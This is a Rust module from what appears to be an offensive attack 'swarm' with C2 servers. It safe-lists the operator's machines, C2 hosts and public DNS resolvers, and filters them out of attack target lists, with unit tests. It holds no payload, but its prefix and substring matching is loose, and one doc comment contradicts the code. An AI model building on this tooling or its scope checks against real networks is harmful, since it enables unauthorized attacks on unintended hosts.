// Brain: safety module that prevents the swarm from attacking
// the operator's machines, C2 servers, or any safe-listed hosts.
//
// Every offensive action checks `Brain::is_safe_target()` first.
// If it returns true, the target is SKIPPED.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HoneycombConfig {
    pub safe_ips: Vec<String>,
    pub safe_hostnames: Vec<String>,
}

impl Default for HoneycombConfig {
    fn default() -> Self {
        Self {
            safe_ips: vec![
                "192.168.1.100".into(),
                "192.168.1.1".into(),
            ],
            safe_hostnames: vec![
                "operator-pc".into(),
                "c2-server".into(),
                "hive-queen".into(),
                "hive-worker".into(),
                "hive-drone".into(),
                "hive-honeybee".into(),
                "hive-weaver".into(),
                "hive-swarm".into(),
                "hive-arena".into(),
                "hive-c2".into(),
                "hive-monitor".into(),
                "hive-dashboard".into(),
            ],
        }
    }
}

/// Check if a target host should NEVER be attacked.
/// Returns true if the target is SAFE (must be skipped).
pub fn is_safe_target(target: &str, config: &HoneycombConfig) -> bool {
    // Check exact IP match
    let target_lower = target.to_lowercase();
    for ip in &config.safe_ips {
        if target == ip || target.starts_with(ip) {
            return true;
        }
    }

    // Check hostname match
    for hostname in &config.safe_hostnames {
        if target_lower.contains(&hostname.to_lowercase()) {
            return true;
        }
    }

    // Also protect localhost and the gateway
    if target == "127.0.0.1" || target == "localhost" || target == "::1" {
        return true;
    }

    // Protect common infrastructure
    if target == "8.8.8.8" || target == "1.1.1.1" || target == "8.8.4.4" {
        return true; // DNS servers
    }

    false
}

/// Filter a list of hosts, removing safe targets.
pub fn filter_safe_targets(hosts: &[String], config: &HoneycombConfig) -> Vec<String> {
    hosts.iter()
        .filter(|h| !is_safe_target(h, config))
        .cloned()
        .collect()
}

/// Safe guard: wraps an action. Returns None if target is protected.
pub fn guard(target: &str, config: &HoneycombConfig) -> bool {
    if is_safe_target(target, config) {
        tracing::warn!("BRAIN: blocked attack on SAFE target: {}", target);
        false
    } else {
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocks_safe_ip() {
        let cfg = HoneycombConfig::default();
        assert!(is_safe_target("192.168.1.100", &cfg));
        assert!(is_safe_target("192.168.1.1", &cfg));
        assert!(!is_safe_target("192.168.1.50", &cfg));
    }

    #[test]
    fn test_blocks_localhost() {
        let cfg = HoneycombConfig::default();
        assert!(is_safe_target("127.0.0.1", &cfg));
        assert!(is_safe_target("localhost", &cfg));
    }

    #[test]
    fn test_blocks_hostname() {
        let cfg = HoneycombConfig::default();
        assert!(is_safe_target("operator-pc", &cfg));
        assert!(is_safe_target("c2-server.internal", &cfg));
        assert!(!is_safe_target("victim-pc", &cfg));
    }
}
